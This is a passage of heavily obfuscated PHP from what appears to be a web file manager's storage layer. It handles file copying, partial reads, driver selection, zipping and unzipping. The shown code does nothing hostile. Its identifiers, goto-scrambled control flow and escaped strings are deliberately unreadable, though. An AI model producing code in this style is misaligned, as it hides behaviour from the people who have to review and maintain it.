= array(250, 600, 1200, 3000, 5000); for ($fµ»•¬ùİ = 0; $fµ»•¬ùİ < count($eµÈ×Ê—„‡); $fµ»•¬ùİ++) { if ($fµ»•¬ùİ == 0 && $e¿åÙ™È¿Ï <= $eµÈ×Ê—„‡[$fµ»•¬ùİ]) { $e¿åÙ™È¿Ï = $eµÈ×Ê—„‡[$fµ»•¬ùİ]; break; } else { if ($e¿åÙ™È¿Ï > $eµÈ×Ê—„‡[$fµ»•¬ùİ - 1] && $e¿åÙ™È¿Ï <= $eµÈ×Ê—„‡[$fµ»•¬ùİ]) { $e¿åÙ™È¿Ï = $eµÈ×Ê—„‡[$fµ»•¬ùİ]; break; } else { if ($fµ»•¬ùİ == count($eµÈ×Ê—„‡) - 1 && $e¿åÙ™È¿Ï > $eµÈ×Ê—„‡[$fµ»•¬ùİ]) { $e¿åÙ™È¿Ï = $eµÈ×Ê—„‡[$fµ»•¬ùİ]; break; } } } } $BàË”¦À¨í = self::driverMake($e“ŸÖ¥×Ì); if ($BàË”¦À¨í->isFileOutServer()) { return $BàË”¦À¨í->fileOutImageServer($e“ŸÖ¥×Ì, $e¿åÙ™È¿Ï); } return $BàË”¦À¨í->fileOutImage($e“ŸÖ¥×Ì, $e¿åÙ™È¿Ï); } private static function driverIsSame($D£éê¢Ÿ•º, $e‚œÈ††¼¨) { goto Cº‰ïŞÏÄ²; Cº‰ïŞÏÄ²: $FÊ‚•¯´×º =& $_SERVER[œº]; $B»Æê™ÆŸ = $D£éê¢Ÿ•º->getType(); $d‰»õ¶‹™Ú = $e‚œÈ††¼¨->getType(); goto aÜº­Ğå‡ë; aÜº­Ğå‡ë: if ($B»Æê™ÆŸ != $d‰»õ¶‹™Ú) { return !1; } if ($B»Æê™ÆŸ == $FÊ‚•¯´×º[718]) { return !0; } if ($B»Æê™ÆŸ == $FÊ‚•¯´×º[106]) { return !0; } goto eÛ³Àóò; eÛ³Àóò: if ($D£éê¢Ÿ•º->pathDriver == $e‚œÈ††¼¨->pathDriver) { return !0; } return !1; goto DæêÔó†¥ğ; DæêÔó†¥ğ: } public static function copyUpdate($eÃ§ÓÕåÎÅ, $Cœ™…•ÓÆ¢) { goto b¡¯¬ˆ¬É; eå»ƒêÎÀ: $c‘Ş§±¯ô = array(); foreach ($Eå‹ÄÔ†Ô¦ as $D½ÆØÙŸ => $b®ß°±ï©) { if (isset($dß‘Å¨á¹¤[$D½ÆØÙŸ])) { if ($b®ß°±ï©[$C¤“»´¹ôŞ[77]] == 1) { continue; } if ($dß‘Å¨á¹¤[$D½ÆØÙŸ][$C¤“»´¹ôŞ[78]] == $b®ß°±ï©[$C¤“»´¹ôŞ[78]]) { continue; } } if ($b®ß°±ï©[$C¤“»´¹ôŞ[77]] == 1) { $c‘Ş§±¯ô[] = $Cœ™…•ÓÆ¢ . $C¤“»´¹ôŞ[8] . $D½ÆØÙŸ; continue; } $C†Ø‚ºŞ˜¹ = strstr(trim($D½ÆØÙŸ, $C¤“»´¹ôŞ[8]), $C¤“»´¹ôŞ[8]) ? get_path_father($D½ÆØÙŸ) : $C¤“»´¹ôŞ[33]; $Fóš·ÛŠÜ[] = array($C¤“»´¹ôŞ[1055] => $b®ß°±ï©[$C¤“»´¹ôŞ[76]], $C¤“»´¹ôŞ[1056] => rtrim($Cœ™…•ÓÆ¢, $C¤“»´¹ôŞ[8]) . $C¤“»´¹ôŞ[8] . $C†Ø‚ºŞ˜¹, $C¤“»´¹ôŞ[1057] => $b®ß°±ï©); } $Aêïêİêš¢ = array($C¤“»´¹ôŞ[193] => $Fóš·ÛŠÜ, $C¤“»´¹ôŞ[77] => $c‘Ş§±¯ô); goto dË©¤òÙ†•; dË©¤òÙ†•: Hook::trigger($C¤“»´¹ôŞ[1058], $eÃ§ÓÕåÎÅ, $Cœ™…•ÓÆ¢, $Aêïêİêš¢); foreach ($c‘Ş§±¯ô as $b®ß°±ï©) { IO::mkdir($b®ß°±ï©); } foreach ($Fóš·ÛŠÜ as $b®ß°±ï©) { IO::copy($b®ß°±ï©[$C¤“»´¹ôŞ[1055]], $b®ß°±ï©[$C¤“»´¹ôŞ[1056]], REPEAT_REPLACE); } goto c½‹¯¢ÔâË; b¡¯¬ˆ¬É: $C¤“»´¹ôŞ =& $_SERVER[œº]; if (!IO::exist($eÃ§ÓÕåÎÅ)) { return !1; } if (!IO::exist($Cœ™…•ÓÆ¢)) { IO::mkdir($Cœ™…•ÓÆ¢); } goto E˜À¡²ßÅ; E˜À¡²ßÅ: $Eå‹ÄÔ†Ô¦ = self::_listAll($eÃ§ÓÕåÎÅ); $dß‘Å¨á¹¤ = self::_listAll($Cœ™…•ÓÆ¢); $Fóš·ÛŠÜ = array(); goto eå»ƒêÎÀ; c½‹¯¢ÔâË: } private static function _listAll($aƒÖ­ç›Î¦) { $F†“Âìš˜  =& $_SERVER[œº]; $aƒÖ­ç›Î¦ = KodIO::clear($aƒÖ­ç›Î¦); $c–Ó¶‚ºŠ„ = IO::listAll($aƒÖ­ç›Î¦); foreach ($c–Ó¶‚ºŠ„ as &$DÉ×ïğ­ƒ×) { $a‘Äñô¾ëä = substr($DÉ×ïğ­ƒ×[$F†“Âìš˜ [76]], strlen($aƒÖ­ç›Î¦)); $DÉ×ïğ­ƒ×[$F†“Âìš˜ [1059]] = trim($a‘Äñô¾ëä, $F†“Âìš˜ [8]); } unset($DÉ×ïğ­ƒ×); return array_to_keyvalue($c–Ó¶‚ºŠ„, $F†“Âìš˜ [1059]); } public static function fileSubstr($cÜ´ëÚ¦ÃÒ, $Bó·İˆ²ƒ, $A¯šÓ…¢› = false) { goto Aº´˜Îª‡; E¬¯Å²„Ó: if ($A¯šÓ…¢› === !1) { $A¯šÓ…¢› = $cğé—Áœã - $Bó·İˆ²ƒ; } if ($Bó·İˆ²ƒ + $A¯šÓ…¢› > $cğé—Áœã) { $A¯šÓ…¢› = $cğé—Áœã - $Bó·İˆ²ƒ; } if (!$cğé—Áœã && $eÉŞ·£½‘¹->getType() == $b¤ê…ÓÌ²ğ[106] && !$eÉŞ·£½‘¹->exist($cÜ´ëÚ¦ÃÒ)) { throw new Exception($b¤ê…ÓÌ²ğ[1060] . LNG($b¤ê…ÓÌ²ğ[1061]) . $b¤ê…ÓÌ²ğ[924] . get_path_this($cÜ´ëÚ¦ÃÒ) . $b¤ê…ÓÌ²ğ[33]); } goto bëÇ£¦Íƒè; B»ÍôäÉŠ½: if (!$e—®ºƒšì³ && $A¯šÓ…¢› && isset($GLOBALS[$b¤ê…ÓÌ²ğ[1062]])) { throw new Exception($GLOBALS[$b¤ê…ÓÌ²ğ[1062]][$b¤ê…ÓÌ²ğ[1063]]); } return $e—®ºƒšì³; goto fí¨ñ; bëÇ£¦Íƒè: if ($A¯šÓ…¢› <= 0) { return $b¤ê…ÓÌ²ğ[33]; } if ($Bó·İˆ²ƒ < 0 || $Bó·İˆ²ƒ >= $cğé—Áœã || $A¯šÓ…¢› > 1024 * 1024 * 5) { throw new Exception("\146\151\154\145\x52\145\141\x64\40\145\162\x72\157\162\41\x20\x73\164\x61\x72\x74\75{$Bó·İˆ²ƒ}\73\154\145\x6e\x67\x74\x68\75{$A¯šÓ…¢›}\73\40\163\x69\x7a\x65\x3d{$cğé—Áœã}\x3b"); } $e—®ºƒšì³ = $eÉŞ·£½‘¹->fileSubstr($cÜ´ëÚ¦ÃÒ, $Bó·İˆ²ƒ, $A¯šÓ…¢›); goto B»ÍôäÉŠ½; Aº´˜Îª‡: $b¤ê…ÓÌ²ğ =& $_SERVER[œº]; $eÉŞ·£½‘¹ = self::driverMake($cÜ´ëÚ¦ÃÒ); $cğé—Áœã = $eÉŞ·£½‘¹->size($cÜ´ëÚ¦ÃÒ); goto b—íÍ‘ã‚®; b—íÍ‘ã‚®: $Aá¢§ƒà—ô = $Bó·İˆ²ƒ; $E‡Æó½‰…‘ = $A¯šÓ…¢›; if ($Bó·İˆ²ƒ < 0) { $Bó·İˆ²ƒ = $cğé—Áœã + $Bó·İˆ²ƒ; } goto E¬¯Å²„Ó; fí¨ñ: } private static function driverMake(&$FĞ–Ãä¿¥Û) { goto aƒ¡ö“ƒùğ; B«ï“Î¼ê÷: return $BÓóî…ÊÜ; goto f©¬ë¾…ÃÃ; aƒ¡ö“ƒùğ: $A«óË¾Øëñ =& $_SERVER[œº]; $B¹¹èêÎ… = KodIO::parse($FĞ–Ãä¿¥Û); if (!self::$driverListSystem) { $fÚµ„òòò˜ = Model($A«óË¾Øëñ[727])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($fÚµ„òòò˜, $A«óË¾Øëñ[393]); } goto bÉ¾ã‡Êô¥; bÉ¾ã‡Êô¥: if ($B¹¹èêÎ…[$A«óË¾Øëñ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$B¹¹èêÎ…[$A«óË¾Øëñ[393]]]) { return !1; } $FĞ–Ãä¿¥Û = $B¹¹èêÎ…[$A«óË¾Øëñ[1064]]; $BÓóî…ÊÜ = self::driverGet($B¹¹èêÎ…, $FĞ–Ãä¿¥Û); goto B«ï“Î¼ê÷; f©¬ë¾…ÃÃ: } private static function driverGet($Fµ…¾Ÿ¨—™, &$B‚Ã½ø®) { goto b­ó‹ëŸÅÅ; b­ó‹ëŸÅÅ: $e›‰£Ö¨¾¤ =& $_SERVER[œº]; $Eœ„´àê­ = $Fµ…¾Ÿ¨—™[$e›‰£Ö¨¾¤[1065]]; $E³óêºäˆ¸ = $Fµ…¾Ÿ¨—™[$e›‰£Ö¨¾¤[393]]; goto BÎ‹ˆè¾Á„; aùê™È­äÚ: $Có¦ÜØ¦Öå->path = $B‚Ã½ø®; return $Có¦ÜØ¦Öå; goto eÎíŠ–÷‹µ; aêÖÔéô¬Á: if (isset($e­È÷‡Ğ[$e›‰£Ö¨¾¤[6]][$e›‰£Ö¨¾¤[1076]])) { $Có¦ÜØ¦Öå->pathBase = rtrim($e­È÷‡Ğ[$e›‰£Ö¨¾¤[6]][$e›‰£Ö¨¾¤[1076]], $e›‰£Ö¨¾¤[8]) . $e›‰£Ö¨¾¤[8]; $B‚Ã½ø® = $Có¦ÜØ¦Öå->pathBase . ltrim($B‚Ã½ø®, $e›‰£Ö¨¾¤[8]); } $B‚Ã½ø® = $Có¦ÜØ¦Öå->getPath($B‚Ã½ø®); if (isset($Fµ…¾Ÿ¨—™[$e›‰£Ö¨¾¤[1048]])) { $B‚Ã½ø® = $Fµ…¾Ÿ¨—™[$e›‰£Ö¨¾¤[1048]]; } goto aùê™È­äÚ; BÎ‹ˆè¾Á„: switch ($Fµ…¾Ÿ¨—™[$e›‰£Ö¨¾¤[29]]) { case KodIO::KOD_IO: $e­È÷‡Ğ = self::$driverListSystem[$E³óêºäˆ¸]; break; case KodIO::KOD_SOURCE: $B‚Ã½ø® = $E³óêºäˆ¸ . $B‚Ã½ø®; $e­È÷‡Ğ = array($e›‰£Ö¨¾¤[1066] => $e›‰£Ö¨¾¤[1067], $e›‰£Ö¨¾¤[6] => $Fµ…¾Ÿ¨—™); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $aÓöœâŠ¦ = $GLOBALS[$e›‰£Ö¨¾¤[1068]]; self::$driverListUser = array_to_keyvalue($aÓöœâŠ¦, $e›‰£Ö¨¾¤[393]); } $e­È÷‡Ğ = self::$driverListUser[$E³óêºäˆ¸]; break; case KodIO::KOD_SHARE_LINK: $e­È÷‡Ğ = array($e›‰£Ö¨¾¤[1066] => $e›‰£Ö¨¾¤[1069], $e›‰£Ö¨¾¤[6] => $Fµ…¾Ÿ¨—™); $B÷ê¾åÛ®… = Action($e›‰£Ö¨¾¤[1070])->sharePathInfo($Fµ…¾Ÿ¨—™[$e›‰£Ö¨¾¤[76]]); $B‚Ã½ø® = $B÷ê¾åÛ®…[$e›‰£Ö¨¾¤[395]]; if (!$B÷ê¾åÛ®…[$e›‰£Ö¨¾¤[395]]) { $BæÉ‘Áõ³È = Model($e›‰£Ö¨¾¤[563])->getInfo($B÷ê¾åÛ®…[$e›‰£Ö¨¾¤[468]]); $B‚Ã½ø® = KodIO::clear($BæÉ‘Áõ³È[$e›‰£Ö¨¾¤[1071]] . $Fµ…¾Ÿ¨—™[$e›‰£Ö¨¾¤[1064]]); $Fµ…¾Ÿ¨—™[$e›‰£Ö¨¾¤[466]] = $BæÉ‘Áõ³È; $Fµ…¾Ÿ¨—™[$e›‰£Ö¨¾¤[1048]] = $B‚Ã½ø®; $e­È÷‡Ğ = array($e›‰£Ö¨¾¤[1066] => $e›‰£Ö¨¾¤[1072], $e›‰£Ö¨¾¤[6] => $Fµ…¾Ÿ¨—™); } break; case KodIO::KOD_SHARE_ITEM: $e­È÷‡Ğ = array($e›‰£Ö¨¾¤[1066] => $e›‰£Ö¨¾¤[1073], $e›‰£Ö¨¾¤[6] => $Fµ…¾Ÿ¨—™); $BæÉ‘Áõ³È = Model($e›‰£Ö¨¾¤[563])->getInfo($Fµ…¾Ÿ¨—™[$e›‰£Ö¨¾¤[393]]); if ($BæÉ‘Áõ³È[$e›‰£Ö¨¾¤[395]] == $e›‰£Ö¨¾¤[191]) { $B‚Ã½ø® = KodIO::clear($BæÉ‘Áõ³È[$e›‰£Ö¨¾¤[1071]] . $Fµ…¾Ÿ¨—™[$e›‰£Ö¨¾¤[1064]]); $Fµ…¾Ÿ¨—™[$e›‰£Ö¨¾¤[466]] = $BæÉ‘Áõ³È; $Fµ…¾Ÿ¨—™[$e›‰£Ö¨¾¤[1048]] = $B‚Ã½ø®; $e­È÷‡Ğ = array($e›‰£Ö¨¾¤[1066] => $e›‰£Ö¨¾¤[1074], $e›‰£Ö¨¾¤[6] => $Fµ…¾Ÿ¨—™); } else { if (!$B‚Ã½ø®) { $B‚Ã½ø® = $BæÉ‘Áõ³È[$e›‰£Ö¨¾¤[395]]; } } break; default: $B‚Ã½ø® = $Fµ…¾Ÿ¨—™[$e›‰£Ö¨¾¤[76]]; $e­È÷‡Ğ = array($e›‰£Ö¨¾¤[1066] => $e›‰£Ö¨¾¤[1075]); break; } $BŠ¼„ˆÅš¶ = $Fµ…¾Ÿ¨—™[$e›‰£Ö¨¾¤[76]]; if (!isset(self::$driverCache[$BŠ¼„ˆÅš¶])) { $e®ö¹ë§ÜÓ = strtolower($e­È÷‡Ğ[$e›‰£Ö¨¾¤[94]]); $dœö”„´•² = $GLOBALS[$e›‰£Ö¨¾¤[6]][$e›‰£Ö¨¾¤[88]][$e›‰£Ö¨¾¤[791]]; $b›„‚²˜° = $e›‰£Ö¨¾¤[72] . (isset($dœö”„´•²[$e®ö¹ë§ÜÓ]) ? $dœö”„´•²[$e®ö¹ë§ÜÓ] : ucfirst($e®ö¹ë§ÜÓ)); if (!class_exists($b›„‚²˜°)) { show_json("{$b›„‚²˜°}\40\x6e\157\x74\x20\x65\170\151\x73\x74\163\x21", !1); } $AˆÓ½ÕÛ„â = isset($e­È÷‡Ğ[$e›‰£Ö¨¾¤[6]]) ? $e­È÷‡Ğ[$e›‰£Ö¨¾¤[6]] : !1; self::$driverCache[$BŠ¼„ˆÅš¶] = new $b›„‚²˜°($AˆÓ½ÕÛ„â); } goto a¶„×„ŒÜŠ; a¶„×„ŒÜŠ: $Có¦ÜØ¦Öå = self::$driverCache[$BŠ¼„ˆÅš¶]; $Có¦ÜØ¦Öå->pathDriver = $Eœ„´àê­; $Có¦ÜØ¦Öå->pathBase = $e›‰£Ö¨¾¤[33]; goto aêÖÔéô¬Á; eÎíŠ–÷‹µ: } public static function errorTips($A¢À¿ïóÜ± = false) { goto Cœ°¿¥ŠÃë; Cœ°¿¥ŠÃë: $eŞÑéÖÒÂ =& $_SERVER[œº]; static $dÒ©ˆÜäÜˆ = array(); $D°â×òÃ¸¨ = 1000; goto eÕà‡ŠŠœÅ; eÕà‡ŠŠœÅ: if ($A¢À¿ïóÜ± === -1) { return $dÒ©ˆÜäÜˆ ? $dÒ©ˆÜäÜˆ[count($dÒ©ˆÜäÜˆ) - 1] : $eŞÑéÖÒÂ[33]; } if ($A¢À¿ïóÜ± === !1) { return implode($eŞÑéÖÒÂ[229], $dÒ©ˆÜäÜˆ); } if (count($dÒ©ˆÜäÜˆ) >= $D°â×òÃ¸¨) { $dÒ©ˆÜäÜˆ = array_slice($dÒ©ˆÜäÜˆ, $D°â×òÃ¸¨ * 0.5, $D°â×òÃ¸¨); } goto Fˆå†±ÙÇä; Fˆå†±ÙÇä: $dÒ©ˆÜäÜˆ[] = $A¢À¿ïóÜ±; write_log($eŞÑéÖÒÂ[160] . ACTION . $eŞÑéÖÒÂ[1077] . $A¢À¿ïóÜ±, $eŞÑéÖÒÂ[1078]); goto dò‡‰ãç±†; dò‡‰ãç±†: } public static function getLastError($A‰‹ÆÒí¢å = '') { $BÀâÙºÉ = self::errorTips(-1); return $BÀâÙºÉ ? $BÀâÙºÉ : $A‰‹ÆÒí¢å; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $d¾±¸•Ê; if (!$d¾±¸•Ê) { $D”íµòˆÄ = IO::init($_SERVER[œº][8]); } return $D”íµòˆÄ; } private static function iconvSystem($eó÷åãêö) { return self::local()->iconvSystem($eó÷åãêö); } private static function iconvApp($B÷”„Í ÏÙ) { return self::local()->iconvApp($B÷”„Í ÏÙ); } public static function zip($D©ƒÖ¯ÎŞ, $F¨±Èâõ« = "\172\151\160", $Cô¤ïáµ„º = '', $e´Ò²Á„ = REPEAT_RENAME) { goto Eê¿©©Œ‘·; cˆ£˜Ğ¾Ï: foreach ($b²ÌÈ¯±ˆÄ as $fòì‰Ã™š‹ => $eÏ‡¦¶•ˆ‹) { $b²ÌÈ¯±ˆÄ[$fòì‰Ã™š‹] = self::iconvSystem($eÏ‡¦¶•ˆ‹); } KodArchive::create($bÒŠ±ï³Ûá, $b²ÌÈ¯±ˆÄ); if (!IO::exist($F´‰¤¾·ˆ)) { if ($Dî÷¸´Æ®Ó) { del_dir($Dî÷¸´Æ®Ó); } show_json(LNG($D¥«îÓöÛ„[1081]), !1); } goto cšÛ ‘¢»’; Eê¿©©Œ‘·: $D¥«îÓöÛ„ =& $_SERVER[œº]; $c‹…å©Ô¶¸ = self::init($D©ƒÖ¯ÎŞ[0][$D¥«îÓöÛ„[76]]); $e±á»‘İİ… = self::info($D©ƒÖ¯ÎŞ[0][$D¥«îÓöÛ„[76]]); goto a’ˆ†˜åœĞ; c÷ê¹¼¢Í: $F´‰¤¾·ˆ = $CİœÏ¥ÉÑœ . $DßÓ½ÏÑÜ‚ . $D¥«îÓöÛ„[95] . $F¨±Èâõ«; $F´‰¤¾·ˆ = get_filename_auto($F´‰¤¾·ˆ, $D¥«îÓöÛ„[33], $e´Ò²Á„); $bÒŠ±ï³Ûá = self::iconvSystem($F´‰¤¾·ˆ); goto cˆ£˜Ğ¾Ï; Bƒ»Œ‚«ÊÄ: if (!$E“ˆ”µ—¯Ü) { del_dir($Dî÷¸´Æ®Ó); show_json(LNG($D¥«îÓöÛ„[1081]), !1); } del_dir($Dî÷¸´Æ®Ó); return $E“ˆ”µ—¯Ü; goto AÈìé¬Ñ²À; dğóƒÅù›: if (count($b²ÌÈ¯±ˆÄ) > 1) { $E «Á…Âæ½ = IO::info(IO::pathFather($e±á»‘İİ…[$D¥«îÓöÛ„[76]])); $DßÓ½ÏÑÜ‚ = $E «Á…Âæ½[$D¥«îÓöÛ„[28]]; } $CİœÏ¥ÉÑœ = $Dî÷¸´Æ®Ó; if (!$CİœÏ¥ÉÑœ) { $CİœÏ¥ÉÑœ = get_path_father($e±á»‘İİ…[$D¥«îÓöÛ„[76]]); if (!$Cô¤ïáµ„º && $c‹…å©Ô¶¸->getType() == $D¥«îÓöÛ„[106]) { $CİœÏ¥ÉÑœ = get_path_father($c‹…å©Ô¶¸->path); } $dìíğ¸ë£ß = IO::info($CİœÏ¥ÉÑœ); if (!$dìíğ¸ë£ß[$D¥«îÓöÛ„[196]]) { show_json(LNG($D¥«îÓöÛ„[1080]), !1); } } goto c÷ê¹¼¢Í; a’ˆ†˜åœĞ: $Dî÷¸´Æ®Ó = !1; if (!$Cô¤ïáµ„º && $c‹…å©Ô¶¸->getType() == $D¥«îÓöÛ„[106]) { $b²ÌÈ¯±ˆÄ = self::zipFileList($D©ƒÖ¯ÎŞ); } else { $Dî÷¸´Æ®Ó = $Cô¤ïáµ„º ? $Cô¤ïáµ„º : TEMP_FILES . $D¥«îÓöÛ„[1079] . time() . rand_string(8) . $D¥«îÓöÛ„[8]; mk_dir($Dî÷¸´Æ®Ó); $b²ÌÈ¯±ˆÄ = self::zipFileList($D©ƒÖ¯ÎŞ, $Dî÷¸´Æ®Ó); } $DßÓ½ÏÑÜ‚ = $e±á»‘İİ…[$D¥«îÓöÛ„[28]]; goto dğóƒÅù›; cšÛ ‘¢»’: if ($Cô¤ïáµ„º || !$Dî÷¸´Æ®Ó) { if ($Dî÷¸´Æ®Ó && strstr($Dî÷¸´Æ®Ó, TEMP_FILES)) { $bŒ©Ô«ˆ½– = $b²ÌÈ¯±ˆÄ = array(); recursion_dir($CİœÏ¥ÉÑœ, $bŒ©Ô«ˆ½–, $b²ÌÈ¯±ˆÄ, 0); foreach ($bŒ©Ô«ˆ½– as $D¢ŞŞïÊ„Õ) { del_dir($D¢ŞŞïÊ„Õ); } foreach ($b²ÌÈ¯±ˆÄ as $DÄÙ˜İçÒ‰) { if ($DÄÙ˜İçÒ‰ == $bÒŠ±ï³Ûá) { continue; } del_file($DÄÙ˜İçÒ‰); } } return $F´‰¤¾·ˆ; } $BØ³îÈ¤± = self::pathFather($e±á»‘İİ…[$D¥«îÓöÛ„[76]]); $E“ˆ”µ—¯Ü = self::move($F´‰¤¾·ˆ, $BØ³îÈ¤±, $e´Ò²Á„); goto Bƒ»Œ‚«ÊÄ; AÈìé¬Ñ²À: } public static function unzip($Dé¸âÄ·í±, $eÖÅ¹”Ÿä = "\x72\145\160\154\141\x63\145") { goto dé“êÓ™«; cÕºÍ»±©¾: foreach ($C§¨°“†È¯ as $e†øäˆ‰†Ş) { $e†øäˆ‰†Ş = self::iconvApp($e†øäˆ‰†Ş); self::move($e†øäˆ‰†Ş, $Dæˆò‹ã, $eÖÅ¹”Ÿä); } del_dir($eƒ¥«¥Ú¶¸); if (!$Dõäƒ¢ìÚù) { del_file($EÇ»Åæò›„); } goto C¤±¯É…ß; DÚİíæßÁö: $F«Ñƒ§œ‹ = KodArchive::extract($EÇ»Åæò›„, $eƒ¥«¥Ú¶¸ . $d÷¾‰¸À³½[8], $a§šŒ†‚Ë¸); self::archiveExt(); if (!$F«Ñƒ§œ‹[$d÷¾‰¸À³½[1086]]) { show_json($d÷¾‰¸À³½[1087] . $F«Ñƒ§œ‹[$d÷¾‰¸À³½[1088]], !1); } goto BÛ¬‹  Ê™; C¤±¯É…ß: return !0; goto d®ÄÑÓÌ†°; BÛ¬‹  Ê™: Hook::trigger($d÷¾‰¸À³½[1089], $eƒ¥«¥Ú¶¸); recursion_dir($eƒ¥«¥Ú¶¸, $dÎÊ¨…¼—Á, $cÌÅÀïÉ, 0); $C§¨°“†È¯ = array_merge($dÎÊ¨…¼—Á, $cÌÅÀïÉ); goto cÕºÍ»±©¾; D³âÒßõ‘ó: if (!($eÒ¬¡«ÁÒ± = parent::info($DÁò‰‡Óˆ))) { show_json(LNG($d÷¾‰¸À³½[1083]), !1); } if (!($cŠâÅñâÍÒ = parent::infoFull($Dæˆò‹ã))) { $Dæˆò‹ã = parent::mkdir($Dæˆò‹ã); $cŠâÅñâÍÒ = array($d÷¾‰¸À³½[76] => $Dæˆò‹ã); } else { if (isset($cŠâÅñâÍÒ[$d÷¾‰¸À³½[395]]) && trim($cŠâÅñâÍÒ[$d÷¾‰¸À³½[76]], $d÷¾‰¸À³½[8]) != trim($Dæˆò‹ã, $d÷¾‰¸À³½[8])) { $b˜­‹‡ò®Š = KodIO::make($cŠâÅñâÍÒ[$d÷¾‰¸À³½[478]]); $C»ŠŞ»¨ğ˜ = parent::fileNameAuto($b˜­‹‡ò®Š, $cŠâÅñâÍÒ[$d÷¾‰¸À³½[28]], REPEAT_RENAME_FOLDER, !0); $Dæˆò‹ã = parent::mkdir($b˜­‹‡ò®Š . $C»ŠŞ»¨ğ˜); $cŠâÅñâÍÒ = array($d÷¾‰¸À³½[76] => $Dæˆò‹ã); } } $Dæˆò‹ã = $cŠâÅñâÍÒ[$d÷¾‰¸À³½[76]]; goto fÜ¡ŸÏ; fÜ¡ŸÏ: $c–ÍˆŸ Î¯ = self::tmpFileName($eÒ¬¡«ÁÒ±); $eƒ¥«¥Ú¶¸ = TEMP_FILES . $c–ÍˆŸ Î¯; del_dir($eƒ¥«¥Ú¶¸); goto eÑ¬ŠÒ¥…Ï; eÑ¬ŠÒ¥…Ï: mk_dir($eƒ¥«¥Ú¶¸); $d®†Ô¸«“ = self::fileExt($eÒ¬¡«ÁÒ±); $EÇ»Åæò›„ = $eƒ¥«¥Ú¶¸ . $d÷¾‰¸À³½[95] . $d®†Ô¸«“; goto DâÆø†Õ©¶; dé“êÓ™«: $d÷¾‰¸À³½ =& $_SERVER[œº]; $DÁò‰‡Óˆ = $Dé¸âÄ·í±[$d÷¾‰¸À³½[76]]; $Dæˆò‹ã = $Dé¸âÄ·í±[$d÷¾‰¸À³½[1082]]; goto D³âÒßõ‘ó; DâÆø†Õ©¶: if (!@file_exists(self::iconvSystem($EÇ»Åæò›„))) { $Dõäƒ¢ìÚù = self::localFilePath($DÁò‰‡Óˆ, $d®†Ô¸«“); $EÇ»Åæò›„ = $Dõäƒ¢ìÚù ? $Dõäƒ¢ìÚù : parent::download($DÁò‰‡Óˆ, $EÇ»Åæò›„); } $EÇ»Åæò›„ = self::iconvSystem($EÇ»Åæò›„); $a§šŒ†‚Ë¸ = isset($Dé¸âÄ·í±[$d÷¾‰¸À³½[1084]]) ? $Dé¸âÄ·í±[$d÷¾‰¸À³½[1084]] : $d÷¾‰¸À³½[1085]; goto DÚİíæßÁö; d®ÄÑÓÌ†°: } public static function unzipList($D®°á÷¼…Õ) { goto D‰»»§µƒÙ; fÊ¬ò¶ ©Ş: $C†¡‘İÄæ‰ = self::info($D¬Ùİ¶Ü ); $cŸÅÆ“¢åÉ = self::fileExt($C†¡‘İÄæ‰); $D™›ƒ÷ò½ = self::tmpFileName($C†¡‘İÄæ‰); goto bìèíëœÊ¿; bìèíëœÊ¿: if (isset($E¨åÕçÉ™Ë)) { $a¨™ç¢ÒÉ« = array($E¨åÕçÉ™Ë[$EŞ˜ØçÁ‹ö[76]], $E¨åÕçÉ™Ë[$EŞ˜ØçÁ‹ö[1090]], $E¨åÕçÉ™Ë[$EŞ˜ØçÁ‹ö[28]]); $Cè÷§ö…ó„ = md5(implode($EŞ˜ØçÁ‹ö[71], $a¨™ç¢ÒÉ«)) . $EŞ˜ØçÁ‹ö[95] . get_path_ext($E¨åÕçÉ™Ë[$EŞ˜ØçÁ‹ö[28]]); } else { $a¨™ç¢ÒÉ« = array($C†¡‘İÄæ‰[$EŞ˜ØçÁ‹ö[28]], $C†¡‘İÄæ‰[$EŞ˜ØçÁ‹ö[76]], $C†¡‘İÄæ‰[$EŞ˜ØçÁ‹ö[78]]); $Cè÷§ö…ó„ = md5(implode($EŞ˜ØçÁ‹ö[71], $a¨™ç¢ÒÉ«)) . $EŞ˜ØçÁ‹ö[95] . $cŸÅÆ“¢åÉ; } if ($b©î­¬‡Õƒ == -1) { $B÷Ûƒ´ÉêÊ = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\x56\151\x65\167\x2f{$D™›ƒ÷ò½}\x2f{$Cè÷§ö…ó„}\x2e\x6c\157\147"; $a˜…°‰‡Ì = self::infoFull($B÷Ûƒ´ÉêÊ); if ($a˜…°‰‡Ì) { $B÷Ûƒ´ÉêÊ = $a˜…°‰‡Ì[$EŞ˜ØçÁ‹ö[76]]; $A·«Ä¤İÖê = self::getContent($B÷Ûƒ´ÉêÊ); if ($A·«Ä¤İÖê) { $f·ˆùŞ¥¾ = json_decode($A·«Ä¤İÖê, !0); if (count($f·ˆùŞ¥¾) >= $A²˜’…¥Ä) { show_json(sprintf(LNG($EŞ˜ØçÁ‹ö[1092]), count($f·ˆùŞ¥¾)), !1); } return $f·ˆùŞ¥¾; } } else { $B÷Ûƒ´ÉêÊ = self::mkfile($B÷Ûƒ´ÉêÊ); } } $D½Ù‡ñÉˆº = TEMP_FILES . $D™›ƒ÷ò½; goto FÜÎ‡¼‘¿ß; b©·ŠÙ»­: return $E“ÙŸˆôÑ[$EŞ˜ØçÁ‹ö[1088]]; goto FÕ’‡ÌğË¼; bô†ïÜÊ¯å: self::archiveExt(); del_dir($D½Ù‡ñÉˆº); if (!$E“ÙŸˆôÑ[$EŞ˜ØçÁ‹ö[1086]]) { show_json($E“ÙŸˆôÑ[$EŞ˜ØçÁ‹ö[1088]], !1); } goto D’æäÔÌ§; DÜí×ÜÌé: $A²˜’…¥Ä = 50000; if (request_url_safe($c·‡ÅÑ‡Ü¶)) { $E¨åÕçÉ™Ë = parse_url_query($c·‡ÅÑ‡Ü¶); if (!isset($E¨åÕçÉ™Ë[$EŞ˜ØçÁ‹ö[76]])) { show_json($EŞ˜ØçÁ‹ö[1091], !1); } } $D¬Ùİ¶Ü  = isset($E¨åÕçÉ™Ë) ? $E¨åÕçÉ™Ë[$EŞ˜ØçÁ‹ö[76]] : $c·‡ÅÑ‡Ü¶; goto fÊ¬ò¶ ©Ş; FÜÎ‡¼‘¿ß: if (!is_dir($D½Ù‡ñÉˆº)) { mk_dir($D½Ù‡ñÉˆº); } $aĞ¬Ò¹šó = $D½Ù‡ñÉˆº . $EŞ˜ØçÁ‹ö[8] . $Cè÷§ö…ó„; if 